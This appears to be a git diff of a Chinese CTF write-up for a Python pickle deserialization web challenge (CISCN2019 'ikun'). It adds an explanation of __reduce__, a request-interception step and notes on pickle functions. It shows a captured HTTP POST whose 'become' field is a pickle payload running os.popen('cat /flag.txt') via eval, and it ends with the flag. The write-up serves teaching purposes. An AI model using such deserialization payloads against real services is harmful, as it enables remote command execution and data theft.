@@ -84,7 +84,7 @@ class AdminHandler(BaseHandler):
             return self.render('form.html', res='This is Black Technology!', member=0)
 ```
 
-原来python里也有[反序列化](https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/),标志就是pickle库。pickle.loads加载一个之前被pickle.dumps后的序列化字符串，重点在于会调用加载对象的__reduce__方法。举个例子。
+原来python里也有[反序列化](https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/),标志就是pickle库。pickle.loads加载一个之前被pickle.dumps后的序列化字符串，重点在于反序列化时会调用加载对象的魔术方法__reduce__。举个例子。
 
 ```python
 import os
@@ -112,6 +112,7 @@ class A(object):
 print(urllib2.quote(pickle.dumps(A()))) 
 ```
 
+然后在b1g_m4mber界面点击“一键成为大会员”，抓包改动become内容为读取flag的对象。
 ```
 POST /b1g_m4mber HTTP/1.1
 Host: 61.147.171.105:61450
@@ -131,5 +132,46 @@ Connection: close
 _xsrf=2%7C82de3f5d%7C03284a08167467c6add3501c539418dd%7C1665803998&become=c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27cat%20/flag.txt%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
 ```
 
-- ### Flag
+在[buuctf](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2]ikun)又遇见这道题了，发现另一个[wp](https://blog.51cto.com/u_15065851/3459481)给出了pickle库常用的几个函数的补充。
+
+```
+（1）pickle.dump(obj, file, [,protocol])
+
+        函数的功能：将obj对象序列化存入已经打开的file中。
+
+       参数讲解：
+
+    obj：想要序列化的obj对象。
+    file:文件名称。
+    protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
+
+（2）pickle.load(file)
+
+        函数的功能：将file中的对象序列化读出。
+
+        参数讲解：
+
+    file：文件名称。
+
+（3）pickle.dumps(obj[, protocol])
+
+       函数的功能：将obj对象序列化为string形式，而不是存入文件中。
+
+       参数讲解：
+
+    obj：想要序列化的obj对象。
+    protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
+
+（4）pickle.loads(string)
+
+       函数的功能：从string中读出序列化前的obj对象。
+
+       参数讲解：
+
+    string：文件名称。
+
+     【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。
+```
+
+## Flag
   > flag{dfe54e6fe1e34f1e8fb03c8b50e963bd}
